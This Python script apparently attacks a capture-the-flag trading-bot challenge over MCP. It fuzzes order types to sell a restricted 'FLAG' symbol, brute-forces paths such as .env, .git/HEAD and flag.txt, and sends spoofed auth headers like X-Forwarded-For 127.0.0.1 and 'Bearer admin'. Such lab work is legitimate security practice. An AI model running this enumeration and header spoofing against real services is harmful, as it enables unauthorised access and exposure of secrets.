#!/usr/bin/env python3
import json, requests
from mcpclient import MCP, extract, BASE

m = MCP()
print("=== FLAG order_type variants ===")
for ot in ["sell","buy","SELL","Sell","sell ","short","long"]:
    try:
        r = m.tool("place_order", {"symbol":"FLAG","quantity":1,"order_type":ot}, timeout=30)
        print(f"  {ot!r}: {extract(r)[:200]}")
    except Exception as e:
        print(f"  {ot!r}: EXC {e}")

print("\n=== public symbol sell without position (engine check) ===")
print("  AAPL sell:", extract(m.tool("place_order", {"symbol":"AAPL","quantity":1,"order_type":"sell"})))

print("\n=== HTTP path brute ===")
paths = ["api","api/v1","v1","mcp/v1","sse","ws","stream","tools","call","invoke","vault","reserve",
         "note","engine","settlement","admin","debug","internal","metrics","status","version","config",
         "env",".env","flag","flags","flag.txt","portfolio","stocks","orders","order","trades","trade",
         "market","book","orderbook","public","private","docs","redoc","openapi.json","swagger",
         ".git/HEAD","robots.txt","sitemap.xml","source","src","app.py","main.py","server.py",
         "requirements.txt","Dockerfile","backup","tmp","uploads","static","assets","index.html",
         "console","shell","graphql","rest","json","rpc","health","healthz","ping","whoami","me"]
found=[]
for p in paths:
    for scheme in ["https"]:
        url = f"{scheme}://kicyber-ec28a209729d-tradebot-0-0.chals.io/{p}"
        try:
            r = requests.get(url, timeout=8, allow_redirects=False)
            if r.status_code not in (404,):
                found.append((r.status_code, p, r.text[:120].replace("\n"," ")))
        except Exception as e:
            found.append(("ERR", p, str(e)[:60]))
for f in found:
    print("  ", f)
print("  total non-404:", len(found))

print("\n=== auth header brute on FLAG read ===")
hdrs = ["Authorization","X-API-Key","X-Auth-Token","X-Internal","X-Settlement-Engine","X-Vault-Access",
        "X-Engine","X-Role","X-Forwarded-For","X-Real-IP","X-Original-URL","X-Rewrite-URL","Cookie",
        "X-Admin","X-Debug","X-User","X-Account"]
vals = {"X-Forwarded-For":"127.0.0.1","X-Real-IP":"127.0.0.1","X-Role":"engine","X-Settlement-Engine":"true",
        "X-Vault-Access":"true","X-Internal":"true","Authorization":"Bearer admin","X-API-Key":"admin",
        "X-Engine":"true","X-Admin":"true","X-Debug":"true"}
for h,v in vals.items():
    hh = m.headers(); hh[h]=v
    body = {"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"get_stock_price","arguments":{"symbol":"FLAG"}}}
    r = m.s.post(BASE+"/mcp", json=body, headers=hh, timeout=15)
    if "RESTRICTED" not in r.text and "error" not in r.text:
        print(f"  HIT {h}:{v} -> {r.text[:200]}")
print("  done header brute")
